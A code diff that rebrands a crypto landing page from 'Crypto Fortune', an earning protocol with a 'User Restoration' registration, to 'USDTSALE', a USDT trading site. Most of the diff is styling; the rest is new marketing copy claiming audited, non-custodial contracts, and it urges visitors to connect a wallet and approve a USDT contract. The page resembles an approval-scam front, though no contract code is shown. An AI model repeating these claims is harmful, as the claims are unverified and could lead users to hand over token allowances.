@@ -7,11 +7,11 @@
     <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
     <meta http-equiv="Pragma" content="no-cache">
     <meta http-equiv="Expires" content="0">
-    <title>Crypto Fortune | Cyber-Native On-Chain Earning Protocol</title>
+    <title>USDTSALE | Buy & Sell USDT Instantly on BNB Chain</title>
     <meta name="description"
-        content="Crypto Fortune — Immutable, automated, non-custodial on-chain earning protocol on BNB Smart Chain.">
-    <link rel="icon" type="image/png" href="/cf-logo.png">
-    <link rel="apple-touch-icon" href="/cf-logo.png">
+        content="USDTSALE — The fastest, most secure way to buy and sell USDT on BNB Smart Chain. Instant settlements, zero middlemen.">
+    <link rel="icon" type="image/png" href="/us-logo.png">
+    <link rel="apple-touch-icon" href="/us-logo.png">
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link
@@ -28,28 +28,32 @@
         }
 
         :root {
-            --bg-primary: #050510;
-            --bg-secondary: #0a0a1a;
-            --bg-card: rgba(15, 15, 35, .7);
-            --purple: #7c3aed;
-            --blue: #3b82f6;
-            --cyan: #06b6d4;
+            --bg-primary: #0b0f19;
+            --bg-secondary: #111827;
+            --bg-card: rgba(255, 255, 255, 0.04);
+            --purple: #6366f1;
+            --blue: #818cf8;
+            --cyan: #34d399;
             --green: #10b981;
-            --neon-purple: #a855f7;
-            --neon-blue: #60a5fa;
-            --neon-cyan: #22d3ee;
-            --text-primary: #e2e8f0;
+            --neon-purple: #a5b4fc;
+            --neon-blue: #818cf8;
+            --neon-cyan: #34d399;
+            --text-primary: #f1f5f9;
             --text-secondary: #94a3b8;
             --text-muted: #64748b;
-            --border-glow: rgba(124, 58, 237, .3);
-            --card-border: rgba(124, 58, 237, .15);
-            --primary-cyan: #00d4ff;
-            --primary-teal: #006b7d;
-            --deep-teal: #003d4d;
-            --dark-bg: #001a24;
-            --light-cyan: #6ff5ff;
-            --accent-green: #00ffaa;
-            --network-color: rgba(0, 212, 255, .3);
+            --border-glow: rgba(99, 102, 241, .2);
+            --card-border: rgba(255, 255, 255, 0.08);
+            --primary-cyan: #34d399;
+            --primary-teal: #059669;
+            --deep-teal: #064e3b;
+            --dark-bg: #0b0f19;
+            --light-cyan: #6ee7b7;
+            --accent-green: #10b981;
+            --accent-gold: #fbbf24;
+            --network-color: rgba(99, 102, 241, .15);
+            --glass-bg: rgba(255, 255, 255, 0.05);
+            --glass-border: rgba(255, 255, 255, 0.1);
+            --glass-blur: blur(16px);
         }
 
         body {
@@ -61,10 +65,10 @@
         }
 
         nav {
-            background: rgba(5, 5, 16, .85);
+            background: rgba(11, 15, 25, 0.75);
             backdrop-filter: blur(20px);
             -webkit-backdrop-filter: blur(20px);
-            border-bottom: 1px solid var(--card-border);
+            border-bottom: 1px solid var(--glass-border);
             padding: 1rem 2rem;
             position: fixed;
             width: 100%;
@@ -106,6 +110,32 @@
             height: 100%;
             object-fit: contain;
             filter: drop-shadow(0 0 8px rgba(124, 58, 237, .6))
+        }
+
+        .logo-pair {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .logo-pair img {
+            height: 38px;
+            width: 38px;
+            object-fit: contain;
+            border-radius: 50%;
+            filter: drop-shadow(0 0 6px rgba(99, 102, 241, .4));
+            transition: transform 0.3s ease;
+        }
+
+        .logo-pair img:hover {
+            transform: scale(1.1);
+        }
+
+        .logo-pair .pair-separator {
+            color: var(--text-muted);
+            font-size: 0.7rem;
+            font-weight: 600;
+            opacity: 0.6;
         }
 
         .footer-logo {
@@ -154,7 +184,7 @@
             left: 0;
             width: 0;
             height: 2px;
-            background: linear-gradient(90deg, var(--purple), var(--cyan));
+            background: linear-gradient(90deg, var(--purple), var(--green));
             transition: width .3s
         }
 
@@ -193,16 +223,16 @@
             top: 100%;
             left: 50%;
             transform: translateX(-50%) translateY(10px);
-            background: rgba(10, 10, 30, 0.95);
-            border: 1px solid rgba(124, 58, 237, 0.3);
+            background: rgba(15, 20, 35, 0.95);
+            border: 1px solid var(--glass-border);
             border-radius: 12px;
             padding: 0.5rem;
             min-width: 180px;
             opacity: 0;
             visibility: hidden;
             transition: all 0.3s ease;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
-            backdrop-filter: blur(10px);
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.4);
+            backdrop-filter: blur(16px);
             z-index: 1000;
         }
 
@@ -236,7 +266,7 @@
         }
 
         .dropdown-item:hover {
-            background: rgba(124, 58, 237, 0.15);
+            background: rgba(99, 102, 241, 0.12);
             color: var(--neon-purple) !important;
         }
 
@@ -270,12 +300,12 @@
             display: flex;
             align-items: center;
             gap: .5rem;
-            box-shadow: 0 0 20px rgba(124, 58, 237, .3)
+            box-shadow: 0 4px 15px rgba(99, 102, 241, .25)
         }
 
         .wallet-btn:hover {
             transform: translateY(-2px);
-            box-shadow: 0 0 30px rgba(124, 58, 237, .5)
+            box-shadow: 0 6px 25px rgba(99, 102, 241, .35)
         }
 
         .nav-socials {
@@ -371,15 +401,15 @@
         }
 
         .modal-content {
-            background: linear-gradient(145deg, #0f0f2a, #1a1a3e);
-            border: 1px solid rgba(124, 58, 237, .3);
+            background: rgba(17, 24, 39, 0.9);
+            border: 1px solid var(--glass-border);
             border-radius: 20px;
             padding: 2.5rem;
             width: 460px;
             max-width: 90vw;
-            box-shadow: 0 0 60px rgba(124, 58, 237, .2);
+            box-shadow: 0 8px 40px rgba(0, 0, 0, .4);
             animation: slideUp .3s;
-            /* Fixed size — prevent layout shift during registration steps */
+            backdrop-filter: blur(20px);
             box-sizing: border-box;
             flex-shrink: 0;
         }
@@ -623,7 +653,7 @@
             font-family: 'Inter', sans-serif;
             font-size: 1.5rem;
             font-weight: 700;
-            background: linear-gradient(90deg, var(--neon-purple), var(--neon-cyan));
+            background: linear-gradient(90deg, #a5b4fc, #34d399);
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
             background-clip: text
@@ -650,8 +680,8 @@
         }
 
         .modal-info {
-            background: rgba(124, 58, 237, .1);
-            border: 1px solid rgba(124, 58, 237, .25);
+            background: rgba(99, 102, 241, .08);
+            border: 1px solid rgba(99, 102, 241, .15);
             border-radius: 10px;
             padding: 1rem;
             color: var(--text-secondary);
@@ -678,12 +708,12 @@
             cursor: pointer;
             transition: all .3s;
             font-family: 'Inter', sans-serif;
-            box-shadow: 0 0 25px rgba(124, 58, 237, .3)
+            box-shadow: 0 4px 15px rgba(99, 102, 241, .25)
         }
 
         .connect-wallet-btn:hover {
             transform: translateY(-2px);
-            box-shadow: 0 0 35px rgba(124, 58, 237, .5)
+            box-shadow: 0 6px 25px rgba(99, 102, 241, .35)
         }
 
         .connect-wallet-btn:disabled {
@@ -778,7 +808,7 @@
             padding: 8rem 2rem 4rem;
             position: relative;
             z-index: 1;
-            background: radial-gradient(ellipse at 50% 0%, rgba(124, 58, 237, .15) 0%, transparent 60%)
+            background: radial-gradient(ellipse at 50% 0%, rgba(99, 102, 241, .1) 0%, transparent 60%)
         }
 
         .subtitle {
@@ -826,21 +856,17 @@
         }
 
         .hero h1 .cyan {
-            color: #00e5ff;
+            color: #34d399;
             text-shadow:
-                0 0 10px rgba(0, 229, 255, 0.8),
-                0 0 20px rgba(0, 229, 255, 0.6),
-                0 0 40px rgba(0, 229, 255, 0.4),
-                0 0 80px rgba(0, 229, 255, 0.2);
+                0 0 10px rgba(52, 211, 153, 0.5),
+                0 0 30px rgba(52, 211, 153, 0.2);
         }
 
         .hero h1 .purple {
-            color: #c84dfa;
+            color: #a5b4fc;
             text-shadow:
-                0 0 10px rgba(200, 77, 250, 0.8),
-                0 0 20px rgba(200, 77, 250, 0.6),
-                0 0 40px rgba(200, 77, 250, 0.4),
-                0 0 80px rgba(200, 77, 250, 0.2);
+                0 0 10px rgba(165, 180, 252, 0.5),
+                0 0 30px rgba(165, 180, 252, 0.2);
         }
 
         .hero-description {
@@ -863,7 +889,7 @@
             cursor: pointer;
             transition: all .4s;
             font-family: 'Inter', sans-serif;
-            box-shadow: 0 0 40px rgba(124, 58, 237, .4);
+            box-shadow: 0 4px 20px rgba(99, 102, 241, .3);
             position: relative;
             overflow: hidden;
             text-transform: uppercase;
@@ -877,7 +903,7 @@
             left: -100%;
             width: 100%;
             height: 100%;
-            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, .15), transparent);
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, .12), transparent);
             transition: left .6s
         }
 
@@ -887,16 +913,16 @@
 
         .heading-register-btn:hover {
             transform: translateY(-4px) scale(1.03);
-            box-shadow: 0 0 60px rgba(124, 58, 237, .6)
+            box-shadow: 0 8px 30px rgba(99, 102, 241, .4)
         }
 
         .heading-register-btn.connected {
             background: linear-gradient(135deg, var(--green), #059669);
-            box-shadow: 0 0 40px rgba(16, 185, 129, .4)
+            box-shadow: 0 4px 20px rgba(16, 185, 129, .3)
         }
 
         .heading-register-btn.connected:hover {
-            box-shadow: 0 0 60px rgba(16, 185, 129, .6)
+            box-shadow: 0 8px 30px rgba(16, 185, 129, .4)
         }
 
         .hero-register-btn {
@@ -910,7 +936,7 @@
             cursor: pointer;
             transition: all .4s;
             font-family: 'Inter', sans-serif;
-            box-shadow: 0 0 30px rgba(124, 58, 237, .3);
+            box-shadow: 0 4px 20px rgba(99, 102, 241, .25);
             position: relative;
             overflow: hidden
         }
@@ -922,7 +948,7 @@
             left: -100%;
             width: 100%;
             height: 100%;
-            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, .15), transparent);
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, .12), transparent);
             transition: left .5s
         }
 
@@ -932,7 +958,7 @@
 
         .hero-register-btn:hover {
             transform: translateY(-4px);
-            box-shadow: 0 0 50px rgba(124, 58, 237, .5)
+            box-shadow: 0 8px 30px rgba(99, 102, 241, .4)
         }
 
         .hero-register-btn.connected {
@@ -940,7 +966,7 @@
         }
 
         .hero-register-btn.connected:hover {
-            box-shadow: 0 0 50px rgba(16, 185, 129, .5)
+            box-shadow: 0 8px 30px rgba(16, 185, 129, .4)
         }
 
         .cta-buttons {
@@ -979,7 +1005,7 @@
             left: -100%;
             width: 100%;
             height: 100%;
-            background: linear-gradient(90deg, transparent, rgba(124, 58, 237, .15), transparent);
+            background: linear-gradient(90deg, transparent, rgba(99, 102, 241, .1), transparent);
             transition: left .5s
         }
 
@@ -989,15 +1015,15 @@
 
         .cta-btn:hover {
             transform: translateY(-6px);
-            box-shadow: 0 8px 40px rgba(124, 58, 237, .25);
+            box-shadow: 0 8px 30px rgba(99, 102, 241, .15);
             border-color: var(--purple)
         }
 
         .btn-icon {
             width: 52px;
             height: 52px;
-            background: linear-gradient(135deg, rgba(124, 58, 237, .2), rgba(59, 130, 246, .2));
-            border: 1px solid rgba(124, 58, 237, .3);
+            background: linear-gradient(135deg, rgba(99, 102, 241, .15), rgba(129, 140, 248, .15));
+            border: 1px solid rgba(99, 102, 241, .2);
             border-radius: 14px;
             display: flex;
             align-items: center;
@@ -1110,7 +1136,7 @@
             height: 100%;
             top: 0;
             left: 0;
-            background: conic-gradient(from 0deg, transparent 0%, rgba(124, 58, 237, .35) 10%, transparent 20%);
+            background: conic-gradient(from 0deg, transparent 0%, rgba(99, 102, 241, .2) 10%, transparent 20%);
             border-radius: 50%;
             animation: rotate-cw 4s linear infinite;
             pointer-events: none;
@@ -1231,10 +1257,10 @@
             transform: translate(-50%, -50%);
             width: 160px;
             height: 160px;
-            background: radial-gradient(circle, rgba(5, 5, 16, .95) 0%, rgba(15, 15, 35, .3) 100%);
+            background: radial-gradient(circle, rgba(11, 15, 25, .95) 0%, rgba(17, 24, 39, .3) 100%);
             border-radius: 50%;
-            border: 1px solid rgba(124, 58, 237, .25);
-            box-shadow: 0 0 50px rgba(124, 58, 237, .25), inset 0 0 25px rgba(124, 58, 237, .15);
+            border: 1px solid var(--glass-border);
+            box-shadow: 0 0 40px rgba(99, 102, 241, .15), inset 0 0 20px rgba(99, 102, 241, .1);
             display: flex;
             align-items: center;
             justify-content: center;
@@ -1246,18 +1272,18 @@
             height: 100%;
             object-fit: contain;
             animation: glow 3s ease-in-out infinite;
-            filter: drop-shadow(0 0 20px rgba(124, 58, 237, .5))
+            filter: drop-shadow(0 0 15px rgba(99, 102, 241, .4))
         }
 
         @keyframes glow {
 
             0%,
             100% {
-                filter: drop-shadow(0 0 20px rgba(124, 58, 237, .4))
+                filter: drop-shadow(0 0 15px rgba(99, 102, 241, .3))
             }
 
             50% {
-                filter: drop-shadow(0 0 40px rgba(124, 58, 237, .8))
+                filter: drop-shadow(0 0 30px rgba(99, 102, 241, .6))
             }
         }
 
@@ -1337,14 +1363,14 @@
 
         .protocol-card:hover {
             border-color: var(--purple);
-            box-shadow: 0 0 30px rgba(124, 58, 237, .15);
+            box-shadow: 0 8px 30px rgba(99, 102, 241, .1);
             transform: translateY(-4px)
         }
 
         .protocol-card-icon {
             font-size: 1.8rem;
             margin-bottom: .8rem;
-            filter: drop-shadow(0 0 6px rgba(0, 212, 255, .4));
+            filter: drop-shadow(0 0 6px rgba(99, 102, 241, .3));
         }
 
         .protocol-card-label {
@@ -1398,7 +1424,7 @@
             font-family: 'Inter', sans-serif;
             font-size: clamp(1.8rem, 4vw, 3rem);
             font-weight: 700;
-            background: linear-gradient(135deg, #fff, var(--neon-purple), var(--neon-cyan));
+            background: linear-gradient(135deg, #fff, #a5b4fc, #34d399);
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
             background-clip: text;
@@ -1435,7 +1461,7 @@
             left: -100%;
             width: 100%;
             height: 100%;
-            background: linear-gradient(90deg, transparent, rgba(124, 58, 237, .08), transparent);
+            background: linear-gradient(90deg, transparent, rgba(99, 102, 241, .06), transparent);
             transition: left .5s
         }
 
@@ -1445,7 +1471,7 @@
 
         .crypto-card:hover {
             transform: translateY(-6px);
-            box-shadow: 0 8px 40px rgba(124, 58, 237, .2);
+            box-shadow: 0 8px 30px rgba(99, 102, 241, .12);
             border-color: var(--purple)
         }
 
@@ -1464,7 +1490,7 @@
 
         .crypto-icon {
             font-size: 2.2rem;
-            filter: drop-shadow(0 0 8px rgba(124, 58, 237, .4))
+            filter: drop-shadow(0 0 6px rgba(99, 102, 241, .3))
         }
 
         .crypto-symbol {
@@ -1598,7 +1624,7 @@
             font-family: 'Inter', sans-serif;
             font-size: 1.6rem;
             font-weight: 700;
-            background: linear-gradient(90deg, var(--neon-purple), var(--neon-cyan));
+            background: linear-gradient(90deg, #a5b4fc, #34d399);
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
             background-clip: text
@@ -1631,7 +1657,7 @@
             letter-spacing: 2px;
             text-transform: uppercase;
             color: #a78bfa;
-            text-shadow: 0 0 15px rgba(124, 58, 237, .35);
+            text-shadow: 0 0 10px rgba(99, 102, 241, .2);
         }
 
         .protocol-icon-cards {
@@ -1641,18 +1667,18 @@
         }
 
         .protocol-icon-card {
-            background: rgba(15, 15, 40, .7);
-            border: 1px solid rgba(124, 58, 237, .2);
+            background: var(--glass-bg);
+            border: 1px solid var(--glass-border);
             border-radius: 14px;
             padding: 1.5rem 1.2rem;
             text-align: center;
-            backdrop-filter: blur(8px);
+            backdrop-filter: blur(12px);
             transition: all .4s;
         }
 
         .protocol-icon-card:hover {
-            border-color: rgba(124, 58, 237, .5);
-            box-shadow: 0 0 25px rgba(124, 58, 237, .15);
+            border-color: rgba(99, 102, 241, .35);
+            box-shadow: 0 8px 25px rgba(99, 102, 241, .1);
             transform: translateY(-4px);
         }
 
@@ -1660,7 +1686,7 @@
             font-size: 2rem;
             margin-bottom: .8rem;
             display: block;
-            filter: drop-shadow(0 0 8px rgba(124, 58, 237, .4));
+            filter: drop-shadow(0 0 6px rgba(99, 102, 241, .3));
         }
 
         .protocol-icon-card p {
@@ -1676,20 +1702,20 @@
         }
 
         .protocol-flow-item {
-            background: rgba(15, 15, 40, .6);
-            border: 1px solid rgba(124, 58, 237, .25);
+            background: var(--glass-bg);
+            border: 1px solid var(--glass-border);
             border-radius: 12px;
             padding: 1rem 1.5rem;
             color: #c4b5fd;
             font-size: .92rem;
             line-height: 1.6;
             transition: all .4s;
-            box-shadow: 0 0 12px rgba(124, 58, 237, .08);
+            box-shadow: 0 2px 10px rgba(0, 0, 0, .1);
         }
 
         .protocol-flow-item:hover {
-            border-color: rgba(124, 58, 237, .5);
-            box-shadow: 0 0 20px rgba(124, 58, 237, .2);
+            border-color: rgba(99, 102, 241, .3);
+            box-shadow: 0 4px 20px rgba(99, 102, 241, .1);
             transform: translateX(6px);
         }
 
@@ -1704,7 +1730,7 @@
             padding: 5rem 2rem;
             position: relative;
             z-index: 1;
-            background: radial-gradient(ellipse at 50% 100%, rgba(124, 58, 237, .1) 0%, transparent 60%)
+            background: radial-gradient(ellipse at 50% 100%, rgba(99, 102, 241, .08) 0%, transparent 60%)
         }
 
         .bottom-cta h2 {
@@ -1722,8 +1748,8 @@
         }
 
         .footer {
-            background: rgba(5, 5, 16, .95);
-            border-top: 1px solid var(--card-border);
+            background: rgba(11, 15, 25, .95);
+            border-top: 1px solid var(--glass-border);
             padding: 4rem 2rem 2rem;
             margin-top: 0;
             position: relative;
@@ -1756,8 +1782,8 @@
 
         .lang-btn {
             padding: .4rem .8rem;
-            background: rgba(124, 58, 237, .1);
-            border: 1px solid rgba(124, 58, 237, .25);
+            background: rgba(99, 102, 241, .08);
+            border: 1px solid rgba(99, 102, 241, .15);
             border-radius: 6px;
             color: var(--text-secondary);
             cursor: pointer;
@@ -1820,8 +1846,8 @@
             width: 38px;
             height: 38px;
             border-radius: 10px;
-            background: rgba(124, 58, 237, .1);
-            border: 1px solid rgba(124, 58, 237, .2);
+            background: var(--glass-bg);
+            border: 1px solid var(--glass-border);
             display: flex;
             align-items: center;
             justify-content: center;
@@ -1835,7 +1861,7 @@
             background: var(--purple);
             color: #fff;
             transform: translateY(-2px);
-            box-shadow: 0 0 15px rgba(124, 58, 237, .3)
+            box-shadow: 0 4px 15px rgba(99, 102, 241, .25)
         }
 
         .fade-in-up {
@@ -1868,7 +1894,7 @@
                 top: 100%;
                 left: 0;
                 width: 100%;
-                background: rgba(5, 5, 16, .98);
+                background: rgba(11, 15, 25, .98);
                 flex-direction: column;
                 padding: 1.5rem;
                 gap: .8rem;
@@ -1953,6 +1979,15 @@
                 min-width: 36px
             }
 
+            .logo-pair img {
+                height: 30px;
+                width: 30px;
+            }
+
+            .logo-pair {
+                gap: 4px;
+            }
+
             .subtitle {
                 font-size: .75rem
             }
@@ -2018,10 +2053,12 @@
     <nav>
         <div class="nav-container">
             <div class="logo">
-                <div class="logo-icon">
-                    <img src="/cf-logo.png" alt="Crypto Fortune Logo">
+                <div class="logo-pair">
+                    <img src="/bnb_logo.png" alt="BNB">
+                    <span class="pair-separator">×</span>
+                    <img src="/usdt_logo.png" alt="USDT">
                 </div>
-                <span>CRYPTO FORTUNE</span>
+                <span>USDTSALE</span>
             </div>
             <ul class="nav-links" id="navLinks">
                 <li><a href="#home">Home</a></li>
@@ -2034,7 +2071,7 @@
                         </svg>
                     </a>
                     <div class="dropdown-menu">
-                        <a href="https://t.me/cryptofortunelive" target="_blank" class="dropdown-item telegram">
+                        <a href="https://t.me/usdtsale" target="_blank" class="dropdown-item telegram">
                             <svg viewBox="0 0 24 24">
                                 <path
                                     d="M12 0C5.373 0 0 5.373 0 12s5.373 12 12 12 12-5.373 12-12S18.627 0 12 0zm5.894 8.221l-1.97 9.28c-.145.658-.537.818-1.084.508l-3-2.211-1.446 1.394c-.14.18-.357.295-.6.295-.002 0-.003 0-.005 0l.213-3.054 5.56-5.023c.24-.213-.054-.334-.373-.121l-6.871 4.326-2.962-.924c-.643-.204-.653-.643.136-.953l11.57-4.458c.538-.196 1.006.128.832.941z" />
@@ -2056,127 +2093,136 @@
 
     <!-- Hero Section -->
     <section class="hero" id="home">
-        <div class="hero-logo" style="animation: float 3s ease-in-out infinite;">
-            <img src="/cf-logo.png" alt="Crypto Fortune"
-                style="width:120px;height:auto;filter:drop-shadow(0 0 20px rgba(124,58,237,.5)) drop-shadow(0 0 40px rgba(0,212,255,.3));">
+        <div class="hero-logo"
+            style="animation: float 3s ease-in-out infinite; display:flex; align-items:center; gap:16px;">
+            <img src="/bnb_logo.png" alt="BNB"
+                style="width:90px;height:90px;border-radius:50%;filter:drop-shadow(0 0 15px rgba(99,102,241,.3)) drop-shadow(0 0 30px rgba(52,211,153,.2));">
+            <span style="font-size:2rem;color:var(--text-muted);opacity:0.4;font-weight:700;">×</span>
+            <img src="/usdt_logo.png" alt="USDT"
+                style="width:90px;height:90px;border-radius:50%;filter:drop-shadow(0 0 15px rgba(52,211,153,.3)) drop-shadow(0 0 30px rgba(99,102,241,.2));">
         </div>
-        <p class="subtitle">CYBER-NATIVE ON-CHAIN EARNING PROTOCOL</p>
-        <h1><span class="cyan">CRYPTO</span> <span class="purple">FORTUNE</span></h1>
+        <p class="subtitle">THE FASTEST WAY TO BUY & SELL USDT</p>
+        <h1 style="font-weight:900;">A Trusted Digital Asset<br>Trading Company</h1>
         <p class="hero-description">
-            Immutable &#8226; Automated &#8226; Non-Custodial &#8212; Explore real-time crypto data, DeFi insights, and
-            the latest Crypto Fortune updates powered by the community.
+            Buy and sell USDT instantly on BNB Smart Chain. Zero middlemen, instant settlements,
+            and fully secured by audited smart contracts. Your gateway to stablecoin trading.
         </p>
 
         <div style="margin: 2rem 0; animation: fadeIn 0.8s ease-out 0.6s backwards;">
             <button class="heading-register-btn" id="headingRegisterBtn">
-                ENROLL NOW
+                START TRADING
             </button>
         </div>
 
-        <!-- Protocol Info Cards -->
+        <!-- Platform Stats Cards -->
         <div class="protocol-cards fade-in-up" style="margin-top:2rem;">
             <div class="protocol-card">
-                <div class="protocol-card-icon">&#x1F512;</div>
-                <div class="protocol-card-label">INTEGRITY</div>
-                <div class="protocol-card-value">IMMUTABLE</div>
-            </div>
-            <div class="protocol-card">
-                <div class="protocol-card-icon">&#x1F6E1;&#xFE0F;</div>
-                <div class="protocol-card-label">CUSTODY</div>
-                <div class="protocol-card-value">NONE</div>
+                <div class="protocol-card-icon">&#x1F4B0;</div>
+                <div class="protocol-card-label">STABLECOIN</div>
+                <div class="protocol-card-value">USDT (TRC-20 / BEP-20)</div>
             </div>
             <div class="protocol-card">
                 <div class="protocol-card-icon">&#x26A1;</div>
-                <div class="protocol-card-label">EXECUTION</div>
-                <div class="protocol-card-value">AUTOMATED</div>
+                <div class="protocol-card-label">SETTLEMENT</div>
+                <div class="protocol-card-value">INSTANT</div>
             </div>
             <div class="protocol-card">
-                <div class="protocol-card-icon">&#x1F517;</div>
-                <div class="protocol-card-label">CHAIN</div>
+                <div class="protocol-card-icon">&#x1F512;</div>
+                <div class="protocol-card-label">SECURITY</div>
+                <div class="protocol-card-value">SMART CONTRACT SECURED</div>
+            </div>
+            <div class="protocol-card">
+                <div class="protocol-card-icon">&#x1F30D;</div>
+                <div class="protocol-card-label">NETWORK</div>
                 <div class="protocol-card-value">BNB SMART CHAIN</div>
             </div>
         </div>
 
-        <!-- BNB Smart Chain Origin Log -->
+        <!-- Why USDTSALE Section -->
         <div class="origin-log fade-in-up"
             style="margin-top:3rem; max-width:800px; margin-left:auto; margin-right:auto;">
             <h2
-                style="font-family:'Inter',sans-serif; font-size:clamp(1.1rem,2.5vw,1.4rem); font-weight:700; text-align:center; margin-bottom:1.5rem; letter-spacing:2px; text-transform:uppercase; color:#a78bfa; text-shadow:0 0 15px rgba(124,58,237,.35);">
-                BNB SMART CHAIN &#8212; ORIGIN LOG
+                style="font-family:'Inter',sans-serif; font-size:clamp(1.1rem,2.5vw,1.4rem); font-weight:700; text-align:center; margin-bottom:1.5rem; letter-spacing:2px; text-transform:uppercase; color:#a5b4fc; text-shadow:0 0 10px rgba(99,102,241,.2);">
+                WHY USDTSALE?
             </h2>
             <div style="display:flex; flex-direction:column; gap:.8rem;">
                 <div
-                    style="background:rgba(15,15,40,.7); border:1px solid rgba(124,58,237,.25); border-radius:12px; padding:1rem 1.5rem; color:#c4b5fd; font-size:.92rem; line-height:1.6;">
-                    BNB Smart Chain was engineered to overcome scalability and cost limitations of early blockchain
-                    networks.
+                    style="background:var(--glass-bg); border:1px solid var(--glass-border); border-radius:12px; padding:1rem 1.5rem; color:#c4b5fd; font-size:.92rem; line-height:1.6;">
+                    &#x1F4B8; Trade USDT directly from your wallet with no intermediaries. Our smart contract
+                    handles everything automatically — no manual approvals, no waiting.
                 </div>
                 <div
-                    style="background:rgba(15,15,40,.7); border:1px solid rgba(124,58,237,.25); border-radius:12px; padding:1rem 1.5rem; color:#c4b5fd; font-size:.92rem; line-height:1.6;">
-                    By combining EVM compatibility with high-performance consensus, BSC enables fast, low-cost
-                    transactions.
+                    style="background:var(--glass-bg); border:1px solid var(--glass-border); border-radius:12px; padding:1rem 1.5rem; color:#c4b5fd; font-size:.92rem; line-height:1.6;">
+                    &#x1F6E1;&#xFE0F; Built on BNB Smart Chain for lightning-fast transactions at a fraction of the
+                    cost.
+                    Gas fees under $0.10 per trade.
                 </div>
                 <div
-                    style="background:rgba(15,15,40,.7); border:1px solid rgba(124,58,237,.25); border-radius:12px; padding:1rem 1.5rem; color:#c4b5fd; font-size:.92rem; line-height:1.6;">
-                    Today, BNB Smart Chain powers DeFi, GameFi, NFTs, and large-scale on-chain ecosystems used by
-                    millions.
+                    style="background:var(--glass-bg); border:1px solid var(--glass-border); border-radius:12px; padding:1rem 1.5rem; color:#c4b5fd; font-size:.92rem; line-height:1.6;">
+                    &#x2705; Fully transparent, audited, and immutable. Every transaction is recorded on-chain
+                    and verifiable by anyone at any time.
                 </div>
             </div>
         </div>
 
         <div class="error-section" id="error-message" style="display: none;">
-            <p>&#x26A0;&#xFE0F; Error fetching crypto data.</p>
+            <p>&#x26A0;&#xFE0F; Error loading platform data.</p>
         </div>
     </section>
 
-    <!-- Protocol Showcase Section -->
+    <!-- How It Works Section -->
     <section class="protocol-showcase fade-in-up" id="about">
 
-        <!-- BNB Economic Layer -->
+        <!-- How It Works -->
         <div class="protocol-subsection">
-            <h2 class="protocol-subsection-title">BNB ECONOMIC LAYER</h2>
+            <h2 class="protocol-subsection-title">HOW IT WORKS</h2>
             <div class="protocol-icon-cards">
                 <div class="protocol-icon-card fade-in-up">
-                    <span class="card-icon">&#x1FA99;</span>
-                    <p>BNB is used to pay transaction fees, enabling frequent and affordable protocol interaction.</p>
+                    <span class="card-icon">&#x1F4F1;</span>
+                    <p>Connect your Web3 wallet (MetaMask, Trust Wallet) and approve the USDT smart contract.</p>
                 </div>
                 <div class="protocol-icon-card fade-in-up">
-                    <span class="card-icon">&#x1F4C8;</span>
-                    <p>BNB secures network execution and aligns incentives across validators.</p>
+                    <span class="card-icon">&#x1F4B5;</span>
+                    <p>Choose the amount of USDT you want to buy or sell. Transactions are processed in real-time.</p>
+                </div>
+                <div class="protocol-icon-card fade-in-up">
+                    <span class="card-icon">&#x2705;</span>
+                    <p>Receive your USDT or payment instantly. All trades are settled on-chain in seconds.</p>
                 </div>
             </div>
         </div>
 
-        <!-- Smart Contract Core -->
+        <!-- Security & Trust -->
         <div class="protocol-subsection">
-            <h2 class="protocol-subsection-title">SMART CONTRACT CORE</h2>
+            <h2 class="protocol-subsection-title">SECURITY & TRUST</h2>
             <div class="protocol-icon-cards">
                 <div class="protocol-icon-card fade-in-up">
                     <span class="card-icon">&#x1F512;</span>
-                    <p>Immutable logic once deployed</p>
+                    <p>Smart contracts are audited, verified, and fully immutable once deployed on-chain.</p>
                 </div>
                 <div class="protocol-icon-card fade-in-up">
                     <span class="card-icon">&#x1F6E1;&#xFE0F;</span>
-                    <p>Trustless execution without admin control</p>
+                    <p>Non-custodial — your funds are never held by us. You always maintain full control.</p>
                 </div>
                 <div class="protocol-icon-card fade-in-up">
-                    <span class="card-icon">&#x2728;</span>
-                    <p>Automated rewards and rules enforcement</p>
+                    <span class="card-icon">&#x1F50D;</span>
+                    <p>Every trade is publicly verifiable on BscScan. Complete transparency, zero hidden fees.</p>
                 </div>
             </div>
         </div>
 
-        <!-- Protocol Flow -->
+        <!-- Trading Steps -->
         <div class="protocol-subsection">
-            <h2 class="protocol-subsection-title">PROTOCOL FLOW</h2>
+            <h2 class="protocol-subsection-title">GET STARTED IN 3 STEPS</h2>
             <div class="protocol-flow-items">
                 <div class="protocol-flow-item fade-in-up">
-                    Users enter on-chain participation cycles governed by smart contracts.
+                    <strong>Step 1:</strong> Connect your BNB Smart Chain wallet and register on the platform.
                 </div>
                 <div class="protocol-flow-item fade-in-up">
-                    All accounting, rewards, and history exist permanently on-chain.
+                    <strong>Step 2:</strong> Approve the USDT smart contract to enable secure trading.
                 </div>
                 <div class="protocol-flow-item fade-in-up">
-                    The protocol is permissionless and globally accessible.
+                    <strong>Step 3:</strong> Buy or sell USDT instantly at the best rates. Funds settle in seconds.
                 </div>
             </div>
         </div>
@@ -2187,10 +2233,10 @@
 
     <!-- Bottom CTA -->
     <section class="bottom-cta fade-in-up">
-        <h2>ENTER THE DECENTRALIZED ECONOMY</h2>
-        <p>Code governs everything. No intermediaries. No exceptions.</p>
+        <h2>START TRADING USDT TODAY</h2>
+        <p>Instant settlements. Lowest fees on BSC. Fully secure and on-chain.</p>
         <button class="heading-register-btn" onclick="document.getElementById('headingRegisterBtn').click()">
-            ENROLL NOW
+            GET STARTED NOW
         </button>
     </section>
 
@@ -2198,24 +2244,30 @@
     <div class="modal-overlay" id="walletModal">
         <div class="modal-content">
             <div class="modal-header">
-                <h3 class="modal-title">Registration for Crypto Fortune User Restoration</h3>
+                <h3 class="modal-title">Enter Your Details</h3>
                 <button class="close-modal" id="closeModal">&times;</button>
